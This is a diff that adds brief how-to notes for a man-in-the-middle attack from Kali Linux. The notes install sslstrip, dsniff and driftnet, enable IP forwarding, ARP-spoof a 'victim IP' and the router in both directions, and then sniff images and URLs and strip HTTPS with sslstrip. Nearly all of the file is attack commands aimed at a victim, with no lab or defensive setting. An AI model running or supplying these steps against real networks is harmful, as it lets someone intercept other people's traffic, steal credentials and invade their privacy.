@@ -1,0 +1,28 @@
+first add repos
+	nano /etc/apt/sources.list
+  		deb http://old.kali.org/kali/ sana main non-free contrib
+    	        deb http://old.kali.org/kali/ moto main non-free contrib 
+do a sudo apt-get update
+	sudo apt-get upgrade (it is going to be huge!)
+	pip install pycparser
+for the following commands you may also need to use a github link
+	sudo apt-get install sslstrip
+	sudo apt-get install dsniff
+	sudo apt-get install driftnet
+Now lets enable packet forwarding in Kali Linux
+	sysctl -w net.ipv4.ip_forward=1
+		to disable
+		        sysctl -w net.ipv4.ip_forward=0
+Now do an arpspoof
+	arpspoof -i (network int name) -t (victim IP) (router IP) LEAVE TERMINAL OPEN
+Now intercept packets from router (OPEN NEW TERMINAL)
+	arpspoof -i (network int name) -t (router IP) (victim IP)
+Sniff images from http sites
+	driftnet -i (network int name)
+Sniff URLs
+	urlsnarf -i (network int name)
+SSL Strip
+	sslstrip -w (file name to save as, such as sslstrip.log) -l (port to listen on such as 80, 8080, 443)
+
+	
+
